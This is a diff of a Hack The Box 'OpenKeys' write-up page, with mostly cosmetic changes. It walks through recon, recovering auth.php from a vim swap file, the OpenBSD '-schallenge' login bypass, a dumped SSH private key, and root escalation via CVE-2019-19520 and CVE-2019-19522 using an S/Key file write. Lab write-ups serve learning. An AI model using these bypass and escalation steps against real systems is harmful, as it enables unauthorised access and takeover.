@@ -1,10 +1,9 @@
-I"�n<blockquote>
-  <p><strong>All information available on this site are for educational purposes only. Use these at your own discretion, the site owners cannot be held responsible for any damages caused.</strong></p>
+I"�n<blockquote>
+  <p><strong>Any actions and or activities related to the material contained within this Website is solely your responsibility.The misuse of the information in this website can result in criminal charges brought against the persons in question.</strong></p>
 </blockquote>
 
 <h2 id="summary"><strong><span style="color:#E70B0B">Summary</span></strong></h2>
 <hr />
-
 <ul>
   <li>Need to recover auth.php with <code class="language-plaintext highlighter-rouge">vim</code>.</li>
   <li>Exploit authentication bypass vulnerability OpenBSD with <code class="language-plaintext highlighter-rouge">-schallenge</code> as the credential for the username.</li>
@@ -14,8 +13,7 @@
 
 <h2 id="port-scans"><strong><span style="color:#E70B0B">Port Scans</span></strong></h2>
 <hr />
-
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -31,7 +29,7 @@
 14
 15
 16
-</pre></td> --><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>nmap <span class="nt">-sCV</span> <span class="nt">-T4</span> openkeys.htb <span class="nt">-oA</span> nmap/output
+</pre></td><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>nmap <span class="nt">-sCV</span> <span class="nt">-T4</span> openkeys.htb <span class="nt">-oA</span> nmap/output
 <span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 09:20 WIB
 Nmap scan report for openkeys.htb (10.10.10.199)
 Host is up (0.11s latency).
@@ -63,7 +61,7 @@ Nmap done: 1 IP address (1 host up) scanned in 27.97 seconds
 <h2 id="fuzzing"><strong><span style="color:#E70B0B">Fuzzing</span></strong></h2>
 <hr />
 
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -85,7 +83,7 @@ Nmap done: 1 IP address (1 host up) scanned in 27.97 seconds
 20
 21
 22
-</pre></td> --><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> 10.10.10.199 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> php,txt <span class="nt">-t</span> 100
+</pre></td><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> 10.10.10.199 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> php,txt <span class="nt">-t</span> 100
 <span class="go">===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -118,7 +116,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 
 <p>I downloaded the file using <code class="language-plaintext highlighter-rouge">wget</code></p>
 
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -130,7 +128,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 10
 11
 12
-</pre></td> --><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>wget http://10.10.10.199/includes/auth.php.swp
+</pre></td><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>wget http://10.10.10.199/includes/auth.php.swp
 <span class="go">--2020-08-10 09:28:53--  http://10.10.10.199/includes/auth.php.swp
 Connecting to 10.10.10.199:80... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -146,29 +144,29 @@ Saving to: ‘auth.php.swp.1’
 
 <p>Identify the file with command <code class="language-plaintext highlighter-rouge">file</code>, it shows username <code class="language-plaintext highlighter-rouge">jennifer</code></p>
 
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-</pre></td> --><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>file auth.php.swp
+</pre></td><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>file auth.php.swp
 <span class="go">auth.php.swp: Vim swap file, version 8.1, pid 49850, user jennifer, host openkeys.htb, file /var/www/htdocs/includes/auth.php
 </span><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> 
 </span></pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>I tried to executed it but the file is broken</p>
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
-</pre></td> --><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>less auth.php.swp
+</pre></td><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>less auth.php.swp
 <span class="go">"auth.php.swp" may be a binary file.  See it anyway? 
 </span></pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>So I recovered it.</p>
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td> --><td class="rouge-code"><pre><span class="gp">vim -r auth.php.swp -&gt;</span><span class="w"> </span>save it
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="gp">vim -r auth.php.swp -&gt;</span><span class="w"> </span>save it
 </pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>And now I can read the php code</p>
 
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -212,7 +210,7 @@ Saving to: ‘auth.php.swp.1’
 42
 43
 44
-</pre></td> --><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
 <span class="k">function</span> <span class="n">authenticate</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
     <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">escapeshellcmd</span><span class="p">(</span><span class="s2">"../auth_helpers/check_auth "</span> <span class="mf">.</span> <span class="nv">$username</span> <span class="mf">.</span> <span class="s2">" "</span> <span class="mf">.</span> <span class="nv">$password</span><span class="p">);</span>
     <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$retcode</span><span class="p">);</span>
@@ -267,7 +265,7 @@ Saving to: ‘auth.php.swp.1’
 
 <p>I downloaded the <code class="language-plaintext highlighter-rouge">check_auth</code> using <code class="language-plaintext highlighter-rouge">wget</code></p>
 
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -279,7 +277,7 @@ Saving to: ‘auth.php.swp.1’
 10
 11
 12
-</pre></td> --><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>wget http://10.10.10.199/auth_helpers/check_auth
+</pre></td><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>wget http://10.10.10.199/auth_helpers/check_auth
 <span class="go">--2020-08-10 09:38:48--  http://10.10.10.199/auth_helpers/check_auth
 Connecting to 10.10.10.199:80... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -295,10 +293,10 @@ Saving to: ‘check_auth’
 
 <p>Identify it with <code class="language-plaintext highlighter-rouge">file</code> commands, it shows its <strong>binary</strong> 64-bit.</p>
 
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-</pre></td> --><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>file check_auth 
+</pre></td><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>file check_auth 
 <span class="go">check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped
 </span><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> 
 </span></pre></td></tr></tbody></table></code></pre></div></div>
@@ -322,7 +320,7 @@ Saving to: ‘check_auth’
 
 <p>After saved it, I tried to login again with <code class="language-plaintext highlighter-rouge">-schallenge</code>, we found <code class="language-plaintext highlighter-rouge">jennifer's</code> private-key.</p>
 
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -362,7 +360,7 @@ Saving to: ‘check_auth’
 38
 39
 40
-</pre></td> --><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span><span class="nb">cat </span>jennifer_rsa
+</pre></td><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span><span class="nb">cat </span>jennifer_rsa
 <span class="go">-----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEAo4LwXsnKH6jzcmIKSlePCo/2YWklHnGn50YeINLm7LqVMDJJnbNx
@@ -406,7 +404,7 @@ qtQ5OEFcmVIA/VAAAAG2plbm5pZmVyQG9wZW5rZXlzLmh0Yi5sb2NhbAECAwQFBgc=
 <h2 id="ssh-as-jennifer"><strong><span style="color:#E70B0B">SSH as jennifer</span></strong></h2>
 <hr />
 
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -433,7 +431,7 @@ qtQ5OEFcmVIA/VAAAAG2plbm5pZmVyQG9wZW5rZXlzLmh0Yi5sb2NhbAECAwQFBgc=
 25
 26
 27
-</pre></td> --><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span><span class="nb">chmod </span>600 jennifer_rsa 
+</pre></td><td class="rouge-code"><pre><span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span><span class="nb">chmod </span>600 jennifer_rsa 
 <span class="gp">root@lordcorshine:~/htb/openkeys#</span><span class="w"> </span>ssh <span class="nt">-i</span> jennifer_rsa jennifer@openkeys.htb
 <span class="go">Last login: Sun Aug  9 14:13:58 2020 from 10.10.14.65
 </span><span class="gp">OpenBSD 6.6 (GENERIC) #</span>353: Sat Oct 12 10:45:56 MDT 2019
@@ -462,10 +460,10 @@ drwx------  2 jennifer  jennifer     512 Jan 13  2020 .ssh
 -rw-r-----  1 jennifer  jennifer      33 Jan 14  2020 user.txt
 </span></pre></td></tr></tbody></table></code></pre></div></div>
 
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-</pre></td> --><td class="rouge-code"><pre><span class="gp">openkeys$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+</pre></td><td class="rouge-code"><pre><span class="gp">openkeys$</span><span class="w"> </span><span class="nb">cat </span>user.txt
 <span class="go">36ab21239a15c537bde90626891d2b10
 </span><span class="gp">openkeys$</span><span class="w"> 
 </span></pre></td></tr></tbody></table></code></pre></div></div>
@@ -476,9 +474,9 @@ drwx------  2 jennifer  jennifer     512 Jan 13  2020 .ssh
 <p>I found great article about the exploitation and it has 3 <code class="language-plaintext highlighter-rouge">CVEs</code>
 <a href="https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt">Exploits</a></p>
 
-<p>There are 3 <code class="language-plaintext highlighter-rouge">CVEs</code> to get root, I used <code class="language-plaintext highlighter-rouge">CVE-2019-19520</code> &amp; <code class="language-plaintext highlighter-rouge">CVE-2019-19522</code> which both of them are related to each other, in order to get root, I had to executed <code class="language-plaintext highlighter-rouge">CVE-2019-19520</code> before <code class="language-plaintext highlighter-rouge">CVE-2019-19522</code>.</p>
+<p>There are 3 <code class="language-plaintext highlighter-rouge">CVEs</code> to get root, I used <code class="language-plaintext highlighter-rouge">CVE-2019-19520</code> &amp; <code class="language-plaintext highlighter-rouge">CVE-2019-19522</code> which both of them are related to each other, in order to get root, we have to executed <code class="language-plaintext highlighter-rouge">CVE-2019-19520</code> before <code class="language-plaintext highlighter-rouge">CVE-2019-19522</code>.</p>
 
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -508,7 +506,7 @@ drwx------  2 jennifer  jennifer     512 Jan 13  2020 .ssh
 28
 29
 30
-</pre></td> --><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
+</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
 <span class="go">uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)
 
 </span><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /tmp
@@ -542,7 +540,7 @@ EOF
 
 <p>And now continue with the next <code class="language-plaintext highlighter-rouge">CVE</code>, it asked for password, simply input <code class="language-plaintext highlighter-rouge">EGG LARD GROW HOG DRAG LAIN</code></p>
 
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -555,7 +553,7 @@ EOF
 11
 12
 13
-</pre></td> --><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
+</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
 <span class="go">uid=32767(nobody) gid=11(auth) groups=32767(nobody)
 
 </span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'root md5 0100 obsd91335 8b6d96e0ef1b1c21'</span> <span class="o">&gt;</span> /etc/skey/root
